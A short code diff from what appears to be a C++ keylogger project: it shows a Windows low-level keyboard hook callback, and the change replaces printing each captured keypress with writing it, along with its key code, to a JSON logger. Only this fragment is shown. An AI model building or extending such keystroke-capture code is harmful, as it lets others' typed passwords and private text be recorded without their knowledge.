@@ -1,5 +1,4 @@
-#include "../include/keylogger.h"
-#include <Windows.h>
+#include "../include/core.h"
 #include <cstdio>
 #include <iostream>
 
@@ -8,6 +7,8 @@ HHOOK hook;
 
 // Contains data received by hook callback.
 KBDLLHOOKSTRUCT kbdStruct;
+
+Loggy::JsonWriter *writer = new Loggy::JsonWriter(operatingSystem);
 
 LRESULT CALLBACK VKeyCodeCb(int code, WPARAM wParam, LPARAM lParam) {
     if (code >= 0)
@@ -18,7 +19,7 @@ LRESULT CALLBACK VKeyCodeCb(int code, WPARAM wParam, LPARAM lParam) {
             // a key (non-system) is pressed.
             kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
             char vkChar = MapVirtualKey(kbdStruct.vkCode, MAPVK_VK_TO_CHAR);
-            std::cout << vkChar << std::endl;
+            writer->Write(vkChar, kbdStruct.vkCode);
         }
     }
 
